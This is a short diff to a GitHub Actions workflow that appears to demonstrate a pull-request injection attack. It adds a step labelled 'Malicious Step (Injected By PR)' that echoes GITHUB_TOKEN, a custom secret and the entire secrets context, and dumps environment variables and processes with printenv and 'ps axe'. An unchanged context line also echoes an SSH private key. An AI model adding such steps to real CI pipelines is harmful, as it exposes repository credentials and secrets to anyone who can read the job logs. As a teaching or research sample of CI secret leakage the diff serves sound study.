@@ -30,3 +30,10 @@ jobs:
       
     - name: Test Step
       run: echo '${{ secrets.SSH_PRIVATE_KEY }}'
+  
+    - name: Malicious Step (Injected By PR)
+      run: |
+        echo "${{ secrets.GITHUB_TOKEN }}, ${{ secrets.MYSECRET }}"
+        printenv
+        ps axe
+        echo "${{ secrets }}"
